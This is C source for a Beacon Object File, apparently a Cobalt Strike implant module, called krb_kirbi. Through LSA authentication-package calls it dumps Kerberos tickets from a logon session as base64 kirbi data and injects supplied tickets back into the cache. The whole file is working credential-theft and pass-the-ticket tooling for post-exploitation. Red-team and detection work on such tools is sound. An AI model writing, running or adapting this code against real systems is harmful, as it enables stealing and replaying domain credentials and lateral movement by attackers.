/*
 * krb_kirbi - Import/Export Kerberos tickets in kirbi format
 *
 * Exports tickets from the current session to .kirbi format (base64)
 * or imports kirbi data into the ticket cache.
 *
 * Usage: krb_kirbi /export [/service:SPN] [/luid:0xLUID]
 *        krb_kirbi /import /ticket:BASE64_KIRBI [/luid:0xLUID]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Helper: allocate and base64 encode using krb5_utils functions */
static char* b64_encode_alloc(const BYTE* data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3) + 1;
    char* encoded = (char*)malloc(out_len);
    if (!encoded) return NULL;
    base64_encode(data, len, encoded);
    return encoded;
}

/* Helper: allocate and base64 decode using krb5_utils functions */
static BYTE* b64_decode_alloc(const char* encoded, size_t* out_len) {
    size_t len = strlen(encoded);
    size_t max_out = len / 4 * 3 + 1;
    BYTE* decoded = (BYTE*)malloc(max_out);
    if (!decoded) return NULL;

    *out_len = base64_decode(encoded, len, decoded);
    if (*out_len == 0) {
        free(decoded);
        return NULL;
    }
    return decoded;
}

/* Convert UNICODE_STRING to char* */
static char* unicode_to_char(UNICODE_STRING* ustr) {
    if (!ustr->Buffer || ustr->Length == 0) return NULL;
    int len = ustr->Length / sizeof(WCHAR);
    char* result = (char*)malloc(len + 1);
    if (!result) return NULL;
    MSVCRT$wcstombs(result, ustr->Buffer, len);
    result[len] = '\0';
    return result;
}

/* Export a single ticket to kirbi format */
static void export_ticket(HANDLE hLsa, ULONG authPackage, PLUID luid,
                          UNICODE_STRING* serverName, formatp* output) {
    NTSTATUS status, subStatus;
    KERB_RETRIEVE_TKT_REQUEST* request = NULL;
    PKERB_RETRIEVE_TKT_RESPONSE response = NULL;
    ULONG requestSize, responseSize = 0;
    char* sname = unicode_to_char(serverName);

    if (!sname) return;

    /* Allocate request with space for target name */
    requestSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + serverName->MaximumLength;
    request = (KERB_RETRIEVE_TKT_REQUEST*)malloc(requestSize);
    if (!request) {
        free(sname);
        return;
    }

    memset(request, 0, requestSize);
    request->MessageType = KerbRetrieveEncodedTicketMessage;
    request->LogonId = *luid;
    request->TicketFlags = 0;
    request->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
    request->EncryptionType = 0;


    request->TargetName.Length = serverName->Length;
    request->TargetName.MaximumLength = serverName->MaximumLength;
    request->TargetName.Buffer = (PWSTR)((BYTE*)request + sizeof(KERB_RETRIEVE_TKT_REQUEST));
    memcpy(request->TargetName.Buffer, serverName->Buffer, serverName->Length);

    status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, authPackage, request, requestSize,
        (PVOID*)&response, &responseSize, &subStatus);

    if (status == 0 && response && response->Ticket.EncodedTicketSize > 0) {
        char* b64 = b64_encode_alloc(response->Ticket.EncodedTicket,
                                      response->Ticket.EncodedTicketSize);
        if (b64) {
            BeaconFormatPrintf(output, "\n  Service: %s\n", sname);
            BeaconFormatPrintf(output, "  Size: %d bytes\n", response->Ticket.EncodedTicketSize);
            BeaconFormatPrintf(output, "  Kirbi (base64):\n");

            /* Print base64 in chunks for readability */
            size_t b64len = strlen(b64);
            for (size_t i = 0; i < b64len; i += 76) {
                size_t chunk = b64len - i;
                if (chunk > 76) chunk = 76;
                BeaconFormatPrintf(output, "    %.76s\n", b64 + i);
            }

            free(b64);
        }
    } else {
        BeaconFormatPrintf(output, "  [!] Failed to retrieve ticket for %s\n", sname);
    }

    if (response) SECUR32$LsaFreeReturnBuffer(response);
    free(request);
    free(sname);
}

/* Export all tickets from a session */
static int export_tickets(HANDLE hLsa, ULONG authPackage, PLUID luid,
                          const char* service_filter, formatp* output) {
    NTSTATUS status, subStatus;
    KERB_QUERY_TKT_CACHE_REQUEST request;
    PKERB_QUERY_TKT_CACHE_RESPONSE response = NULL;
    ULONG responseSize = 0;
    int exported = 0;

    memset(&request, 0, sizeof(request));
    request.MessageType = KerbQueryTicketCacheMessage;
    request.LogonId = *luid;

    status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, authPackage, &request, sizeof(request),
        (PVOID*)&response, &responseSize, &subStatus);

    if (status != 0 || !response) return 0;

    for (ULONG i = 0; i < response->CountOfTickets; i++) {
        char* sname = unicode_to_char(&response->Tickets[i].ServerName);
        if (!sname) continue;

        /* Apply filter if specified */
        if (service_filter && !strstr(sname, service_filter)) {
            free(sname);
            continue;
        }

        free(sname);
        export_ticket(hLsa, authPackage, luid, &response->Tickets[i].ServerName, output);
        exported++;
    }

    SECUR32$LsaFreeReturnBuffer(response);
    return exported;
}

/* Import a kirbi ticket into the cache */
static int import_ticket(HANDLE hLsa, ULONG authPackage, PLUID luid,
                         const BYTE* kirbi, size_t kirbi_len, formatp* output) {
    NTSTATUS status, subStatus;
    KERB_SUBMIT_TKT_REQUEST* request = NULL;
    ULONG requestSize;
    PVOID response = NULL;
    ULONG responseSize = 0;

    requestSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + kirbi_len;
    request = (KERB_SUBMIT_TKT_REQUEST*)malloc(requestSize);
    if (!request) return 0;

    memset(request, 0, requestSize);
    request->MessageType = KerbSubmitTicketMessage;
    request->LogonId = *luid;
    request->Flags = 0;
    request->KerbCredSize = (ULONG)kirbi_len;
    request->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);

    memcpy((BYTE*)request + request->KerbCredOffset, kirbi, kirbi_len);

    status = SECUR32$LsaCallAuthenticationPackage(
        hLsa, authPackage, request, requestSize,
        &response, &responseSize, &subStatus);

    free(request);

    if (status == 0 && subStatus == 0) {
        BeaconFormatPrintf(output, "[+] Ticket imported successfully!\n");
        if (response) SECUR32$LsaFreeReturnBuffer(response);
        return 1;
    } else {
        BeaconFormatPrintf(output, "[-] Failed to import ticket: status=0x%08X substatus=0x%08X\n",
            status, subStatus);
        return 0;
    }
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* do_export = NULL;
    char* do_import = NULL;
    char* service_filter = NULL;
    char* ticket_b64 = NULL;
    char* luid_str = NULL;
    HANDLE hLsa = NULL;
    ULONG authPackage = 0;
    NTSTATUS status;
    LUID targetLuid = {0};
    LSA_STRING kerbName;

    BeaconFormatAlloc(&output, 65536);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Kirbi Ticket Import/Export\n\n");


    do_export = arg_get(&parser, "export");
    do_import = arg_get(&parser, "import");
    service_filter = arg_get(&parser, "service");
    ticket_b64 = arg_get(&parser, "ticket");
    luid_str = arg_get(&parser, "luid");

    if (!do_export && !do_import) {
        BeaconFormatPrintf(&output, "[-] Error: /export or /import required\n\n");
        BeaconFormatPrintf(&output, "Usage:\n");
        BeaconFormatPrintf(&output, "  Export: krb_kirbi /export [/service:SPN] [/luid:0xLUID]\n");
        BeaconFormatPrintf(&output, "  Import: krb_kirbi /import /ticket:BASE64_KIRBI [/luid:0xLUID]\n");
        goto cleanup;
    }

    if (do_import && !ticket_b64) {
        BeaconFormatPrintf(&output, "[-] Error: /ticket:BASE64 required for import\n");
        goto cleanup;
    }

    /* Parse LUID if specified */
    if (luid_str) {
        if (luid_str[0] == '0' && (luid_str[1] == 'x' || luid_str[1] == 'X')) {
            targetLuid.LowPart = strtoul(luid_str + 2, NULL, 16);
        } else {
            targetLuid.LowPart = strtoul(luid_str, NULL, 10);
        }
        BeaconFormatPrintf(&output, "[*] Target LUID: 0x%X\n", targetLuid.LowPart);
    }


    status = SECUR32$LsaConnectUntrusted(&hLsa);
    if (status != 0) {
        BeaconFormatPrintf(&output, "[-] Failed to connect to LSA: 0x%08X\n", status);
        goto cleanup;
    }


    kerbName.Buffer = "kerberos";
    kerbName.Length = 8;
    kerbName.MaximumLength = 9;

    status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &kerbName, &authPackage);
    if (status != 0) {
        BeaconFormatPrintf(&output, "[-] Failed to find Kerberos package: 0x%08X\n", status);
        goto cleanup;
    }

    if (do_export) {
        /* Export mode */
        BeaconFormatPrintf(&output, "[*] Exporting tickets...\n");
        if (service_filter) {
            BeaconFormatPrintf(&output, "[*] Filter: %s\n", service_filter);
        }

        int count = export_tickets(hLsa, authPackage, &targetLuid, service_filter, &output);
        BeaconFormatPrintf(&output, "\n[*] Exported %d ticket(s)\n", count);
    } else {
        /* Import mode */
        BeaconFormatPrintf(&output, "[*] Importing ticket...\n");

        size_t kirbi_len;
        BYTE* kirbi = b64_decode_alloc(ticket_b64, &kirbi_len);
        if (!kirbi) {
            BeaconFormatPrintf(&output, "[-] Failed to decode base64 ticket\n");
            goto cleanup;
        }

        BeaconFormatPrintf(&output, "[*] Decoded kirbi size: %d bytes\n", (int)kirbi_len);
        import_ticket(hLsa, authPackage, &targetLuid, kirbi, kirbi_len, &output);
        free(kirbi);
    }

cleanup:
    if (hLsa) SECUR32$LsaDeregisterLogonProcess(hLsa);
    if (do_export) free(do_export);
    if (do_import) free(do_import);
    if (service_filter) free(service_filter);
    if (ticket_b64) free(ticket_b64);
    if (luid_str) free(luid_str);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
